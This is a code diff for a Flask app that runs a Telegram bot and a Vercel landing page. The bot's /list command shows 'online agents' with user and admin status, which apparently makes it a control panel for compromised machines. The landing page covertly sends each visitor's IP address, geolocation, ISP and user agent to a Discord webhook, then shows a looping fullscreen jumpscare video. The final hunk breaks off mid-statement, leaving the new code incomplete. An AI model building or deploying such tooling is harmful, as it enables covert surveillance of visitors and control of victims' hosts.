@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION - Fixed server error and updated jumpscare video.
+# FINAL VERSION v5 - Corrected Markdown in /list and updated jumpscare video.
 
 import os
 import re
@@ -9,7 +9,7 @@ import httpx
 import asyncio
 import traceback
 import time
-import threading # <--- THIS LINE WAS MISSING AND CAUSED THE CRASH
+import threading
 from flask import Flask, request
 
 from telegram import Update
@@ -121,6 +121,7 @@ async def cmd_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
             for agent in active_agents:
                 is_admin_text = "Admin" if agent.get('is_admin') else "User"
                 agent_user = agent.get('user', 'N/A')
+                # --- THIS IS THE CORRECTED LINE ---
                 message += f"🟢 *ONLINE*\n`{esc(agent.get('id'))}`\n*User:* {esc(agent_user)} `\\({esc(is_admin_text)}\\)`\n\n"
     except Exception as e:
         message = f"❌ Error fetching agent list: `{esc(str(e))}`"
@@ -198,9 +199,7 @@ def process_webhook():
     return 'OK', 200
 
 def log_to_discord(ip, user_agent):
-    """Fetches geolocation data and sends a detailed log to Discord."""
-    if not DISCORD_WEBHOOK_URL:
-        return
+    if not DISCORD_WEBHOOK_URL: return
     geo_info = {}
     try:
         import requests
@@ -213,19 +212,7 @@ def log_to_discord(ip, user_agent):
     except Exception:
         geo_info['Error'] = 'Geolocation lookup failed'
 
-    embed = {
-        "title": "👁️ Vercel Site Visitor",
-        "color": 3447003, # Blue
-        "description": f"A new visitor has accessed the landing page.",
-        "fields": [
-            {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
-            {"name": "🌍 Country", "value": geo_info.get('Country', 'N/A'), "inline": True},
-            {"name": "🏙️ City", "value": geo_info.get('City', 'N/A'), "inline": True},
-            {"name": "🏢 ISP", "value": geo_info.get('ISP', 'N/A'), "inline": False},
-            {"name": "🖥️ User Agent", "value": f"```{user_agent}```"}
-        ],
-        "footer": {"text": f"Timestamp: {time.ctime()}"}
-    }
+    embed = { "title": "👁️ Vercel Site Visitor", "color": 3447003, "description": f"A new visitor has accessed the landing page.", "fields": [{"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True}, {"name": "🌍 Country", "value": geo_info.get('Country', 'N/A'), "inline": True}, {"name": "🏙️ City", "value": geo_info.get('City', 'N/A'), "inline": True}, {"name": "🏢 ISP", "value": geo_info.get('ISP', 'N/A'), "inline": False}, {"name": "🖥️ User Agent", "value": f"```{user_agent}```"}], "footer": {"text": f"Timestamp: {time.ctime()}"} }
     data = {"embeds": [embed]}
     try:
         requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
@@ -238,7 +225,7 @@ def health_check_and_scare():
     user_agent = request.headers.get('User-Agent', 'Unknown')
     threading.Thread(target=log_to_discord, args=(ip_address, user_agent)).start()
 
-    # --- Jumpscare HTML with Video ---
+    # --- Jumpscare HTML with the video you provided ---
     html_content = """
     <!DOCTYPE html>
     <html lang="en">
@@ -272,27 +259,5 @@ def health_check_and_scare():
                 document.getElementById('container').style.display = 'none';
                 scareContainer.style.display = 'block';
                 
-                scareVideo.muted = false; // The video has its own sound
-                scareVideo.play().catch(e => console.error("Autoplay failed:", e));
-                
-                // When the video ends, loop it by resetting and playing again
-                scareVideo.onended = function() {
-                    this.currentTime = 0;
-                    this.play();
-                };
-
-                try {
-                    if (scareContainer.requestFullscreen) {
-                        scareContainer.requestFullscreen();
-                    } else if (scareContainer.webkitRequestFullscreen) { /* Safari */
-                        scareContainer.webkitRequestFullscreen();
-                    }
-                } catch (e) {
-                    console.log('Fullscreen API not supported.');
-                }
-            });
-        </script>
-    </body>
-    </html>
-    """
-    return html_content
+                scareVideo.muted = false;
+                scareVideo
